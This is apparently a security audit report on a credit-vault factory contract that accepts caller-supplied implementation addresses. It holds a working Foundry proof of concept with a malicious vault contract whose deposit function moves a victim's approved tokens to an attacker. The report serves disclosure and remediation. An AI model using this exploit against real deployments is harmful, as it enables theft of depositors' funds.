### Title
Unprivileged deployment of arbitrary credit-vault implementations enables factory-branded fund theft - ([File: contracts/IdleCreditVaultFactory.sol])

### Summary

`deployCreditVault` and `deployRevolvingCreditVault` are externally callable and accept caller-supplied implementation addresses for the credit vault, strategy, queue, write-off escrow, and programmable borrower. [1](#0-0) [2](#0-1) 

The factory passes those unvalidated addresses directly to `TransparentUpgradeableProxy`, so an attacker can register malicious code under an authentic `CreditVaultDeployed` event. [3](#0-2) [4](#0-3) 

### Finding Description

The deployment functions only check minimum fees and a nonzero manager; they do not restrict the caller or compare submitted implementation addresses against trusted implementations. [5](#0-4) [6](#0-5) 

`_deployBaseCreditVault` installs `strategyData.implementation` and `cvParams.implementation` as the runtime code of the newly deployed proxies. [3](#0-2) 

A malicious `cvParams.implementation` only needs to accept the configuration calls made by `_configureCreditVault` and can then execute arbitrary logic inside the proxy when users call deposit functions. [7](#0-6) 

For example, its `depositAA` implementation can call `transferFrom(victim, attacker, amount)` using the victim’s normal ERC20 approval instead of minting legitimate tranche shares. [8](#0-7) 

Transferring proxy ownership to `treasury` does not constrain the already-installed malicious implementation because all subsequent user calls are delegated to that attacker-controlled code. [9](#0-8) [4](#0-3) 

### Impact Explanation

An unprivileged attacker can cause the factory to emit an official-looking deployment whose credit-vault proxy runs attacker code. [10](#0-9) 

A victim who deposits `N` underlying tokens into that proxy can have the full `N` tokens transferred directly to the attacker, with loss quantified as `N`; the same mechanism can permanently freeze funds by consuming deposits without minting redeemable shares. [8](#0-7) 

### Likelihood Explanation

No privileged role, borrower cooperation, oracle manipulation, or special epoch phase is required because the implementation address is supplied by the external caller during buffer/pre-launch deployment. [11](#0-10) [12](#0-11) 

Exploitation requires a victim to trust the factory deployment event or an integrating interface and approve the resulting proxy, which is a realistic interaction for a deployment factory. [13](#0-12) 

### Recommendation

Replace caller-supplied implementation fields with factory-controlled, immutable implementation addresses, or maintain a treasury-controlled allowlist and reject every implementation not present in it. [14](#0-13) 

The event should only be emitted after all deployed proxies point to allowed implementations, and deployment should otherwise be restricted to the treasury if arbitrary vault creation is not intended. [10](#0-9) 

### Proof of Concept

The following Foundry test demonstrates that an unprivileged caller can deploy a factory-registered credit vault backed by malicious code and steal a depositor’s approved tokens.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";

contract PoCToken is ERC20 {
    constructor() ERC20("PoC USD", "pUSD") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ProxyRegistry {
    address public creditVault;

    function set(address proxy) external {
        creditVault = proxy;
    }
}

contract MaliciousCreditVault {
    address internal immutable thief;
    ProxyRegistry internal immutable registry;
    address internal underlying;

    constructor(address thief_, ProxyRegistry registry_) {
        thief = thief_;
        registry = registry_;
    }

    // Selector used by IdleCreditVaultFactory._deployBaseCreditVault.
    function initialize(
        uint256,
        address guardedToken,
        address,
        address,
        address,
        address,
        uint256
    ) external {
        underlying = guardedToken;
        registry.set(address(this));
    }

    // Same selector as IdleCDOCreditVault.depositAA(uint256).
    function depositAA(uint256 amount) external returns (uint256) {
        IERC20(underlying).transferFrom(msg.sender, thief, amount);
        return 0;
    }

    // Absorb all factory configuration calls and transferOwnership.
    fallback() external {}
}

contract FactoryArbitraryImplementationPoC is Test {
    function testUnprivilegedDeployerInstallsMaliciousCreditVault() external {
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address attacker = makeAddr("attacker");
        address manager = makeAddr("manager");
        address victim = makeAddr("victim");
        uint256 depositAmount = 1_000_000e6;

        PoCToken underlying = new PoCToken();
        underlying.mint(victim, depositAmount);

        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(
            address(new TransparentUpgradeableProxy(
                address(factoryImpl),
                proxyAdmin,
                abi.encodeWithSelector(
                    IdleCreditVaultFactory.initialize.selector,
                    treasury,
                    proxyAdmin
                )
            ))
        );

        ProxyRegistry registry = new ProxyRegistry();
        MaliciousCreditVault maliciousCdo =
            new MaliciousCreditVault(attacker, registry);
        IdleCreditVault strategyImpl = new IdleCreditVault();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(maliciousCdo),
                limit: 0,
                underlying: address(underlying),
                apr: 10e18,
                epochDuration: 30 days,
                bufferPeriod: 5 days,
                instantWithdrawDelay: 3 days,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: makeAddr("feeReceiver"),
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImpl),
                manager: manager,
                borrower: makeAddr("borrower"),
                borrowerName: "Borrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.prank(attacker);
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        address maliciousProxy = registry.creditVault();
        assertTrue(maliciousProxy != address(0));

        vm.startPrank(victim);
        underlying.approve(maliciousProxy, depositAmount);
        MaliciousCreditVault(maliciousProxy).depositAA(depositAmount);
        vm.stopPrank();

        assertEq(underlying.balanceOf(victim), 0);
        assertEq(underlying.balanceOf(attacker), depositAmount);
    }
}
```

The malicious fallback accepts `setEpochParams`, `setInstantWithdrawParams`, `setKeyringParams`, fee configuration, guardian configuration, and `transferOwnership`, allowing the deployment transaction to finish and emit `CreditVaultDeployed`. [7](#0-6) [9](#0-8)

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L25-32)
```text
  event CreditVaultDeployed(
    address creditVault,
    address strategy,
    address queue,
    address programmableBorrower,
    address keyringWhitelist,
    address writeOffEscrow
  );
```

**File:** contracts/IdleCreditVaultFactory.sol (L52-90)
```text
  struct StrategyData {
    address implementation;
    address manager;
    address borrower;
    string borrowerName;
  }

  struct CreditVaultParams {
    address implementation;
    uint256 limit;
    address underlying;
    uint256 apr;
    uint256 epochDuration;
    uint256 bufferPeriod;
    uint256 instantWithdrawDelay;
    uint256 instantWithdrawAprDelta;
    bool disableInstantWithdraw;
    uint256 keyringPolicy;
    address feeReceiver;
    uint256 fees;
    uint256 managementFee;
    bool isInterestMinted;
    bool isDepositDuringEpochDisabled;
  }

  struct AncillaryParams {
    // Underlying Keyring credential contract. address(0) disables Keyring for the deployed vault.
    address keyring;
    address queueImplementation;
    uint256 prefundedDepositWindow;
    address writeOffImplementation;
  }

  struct ProgrammableBorrowerParams {
    address implementation;
    address vault;
    address borrower;
    uint256 borrowerApr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L92-105)
```text
  function deployCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    AncillaryParams memory ancillaryParams
  ) external {
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    (IdleCDOEpochVariant cv, IdleCreditVault strategy) =
      _deployBaseCreditVault(strategyData, cvParams);

    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);
```

**File:** contracts/IdleCreditVaultFactory.sol (L112-123)
```text
    // Transfer ownership of strategy and credit vault to treasury
    strategy.transferOwnership(treasury);
    cv.transferOwnership(treasury);

    emit CreditVaultDeployed(
      address(cv),
      address(strategy),
      address(queue),
      address(0),
      keyringWhitelist,
      address(writeOffEscrow)
    );
```

**File:** contracts/IdleCreditVaultFactory.sol (L126-131)
```text
  function deployRevolvingCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    AncillaryParams memory ancillaryParams
  ) external {
```

**File:** contracts/IdleCreditVaultFactory.sol (L182-207)
```text
    strategy = IdleCreditVault(_deployProxy(
      strategyData.implementation,
      abi.encodeWithSelector(
        IdleCreditVault.initialize.selector,
        cvParams.underlying,
        address(this),
        strategyData.manager,
        strategyData.borrower,
        strategyData.borrowerName,
        cvParams.apr
      )
    ));

    cv = IdleCDOEpochVariant(_deployProxy(
      cvParams.implementation,
      abi.encodeWithSelector(
        IdleCDOCreditVault.initialize.selector,
        cvParams.limit,
        cvParams.underlying,
        treasury,
        address(this),
        address(0),
        address(strategy),
        FULL_ALLOC
      )
    ));
```

**File:** contracts/IdleCreditVaultFactory.sol (L280-285)
```text
  function _deployProxy(address implementation, bytes memory data) internal returns (address) {
    return address(new TransparentUpgradeableProxy(
      implementation,
      proxyAdmin,
      data
    ));
```

**File:** contracts/IdleCreditVaultFactory.sol (L288-307)
```text
  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L309-311)
```text
  function _checkMinimumFees(CreditVaultParams memory cvParams) internal pure {
    if (cvParams.fees < MIN_PERFORMANCE_FEE && cvParams.managementFee < MIN_MANAGEMENT_FEE) revert FeesTooLow();
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L99-101)
```text
  function depositAA(uint256 _amount) external returns (uint256) {
    return _deposit(_amount, AATranche);
  }
```
